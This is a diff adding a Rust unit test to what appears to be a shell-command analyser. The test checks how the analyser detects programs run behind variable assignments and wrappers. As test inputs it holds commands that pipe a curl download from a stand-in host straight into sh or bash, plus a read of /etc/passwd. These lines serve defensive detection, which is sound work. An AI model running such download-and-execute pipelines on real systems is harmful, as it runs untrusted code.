@@ -340,6 +340,62 @@ fn what_a_variable_is_given_by_a_command_is_that_commands_to_read() {
 }
 
 #[test]
+fn a_program_after_a_variable_given_by_a_command_is_still_run() {
+    use super::{run_targets, runs_file};
+    // The substitution closes in the assignment: the program follows.
+    for line in [
+        "x=$(date) sh i.sh",
+        "x=$(date) bash ./i.sh",
+        "JOBS=$(nproc) ./i.sh",
+        "x=`date` sh i.sh",
+        "x=\"$(date)\" sh i.sh",
+        "x=$() sh i.sh",
+        "A=$(a) B=$(b) sh i.sh",
+        "x=$(date) y=2 sh i.sh",
+        "sudo x=$(date) sh i.sh",
+        "timeout 5 x=$(date) sh i.sh",
+        "PATH=$(pwd)/bin:$PATH sh i.sh",
+        // Wrappers inside the substitution are read past as anywhere.
+        "x=$(sudo sh i.sh)",
+        "x=$(env FOO=1 sh i.sh)",
+        "x=$(exec sh i.sh)",
+        "x=$(nice bash ./i.sh)",
+        "x=$(timeout 5 sh i.sh)",
+        "x=$(sudo -u build sh i.sh)",
+    ] {
+        assert!(runs_file(line, "i.sh"), "{line}");
+        assert_eq!(
+            run_targets(line).first().map(String::as_str),
+            Some("i.sh"),
+            "{line}"
+        );
+    }
+    // What is piped into a shell behind such an assignment.
+    for line in [
+        "curl https://x.example/a | x=$(date) sh",
+        "curl https://x.example/a | x=$(date) bash -s",
+    ] {
+        assert!(
+            rules_for(line).contains(&RuleId::DownloadAndExecute),
+            "{line}"
+        );
+    }
+    // A value that is a whole command names one program, not its words.
+    assert!(run_targets("x=\"$(cat /etc/passwd)\"").is_empty());
+    assert!(run_targets("PATH=$(pwd)/bin:$PATH make").is_empty());
+    // A file command is one inside a substitution or after one.
+    for line in [
+        "x=$(sudo install -m755 mkfs.ext4 /usr/bin)",
+        "x=$(date) install -m755 mkfs.ext4 /usr/bin",
+    ] {
+        assert!(
+            !rules_for(line).contains(&RuleId::DestructiveSystemOperation),
+            "{line}"
+        );
+    }
+}
+
+#[test]
 fn a_run_behind_a_wrapper_an_assignment_or_a_group_is_still_a_run() {
     use super::{run_targets, runs_file};
     for line in [
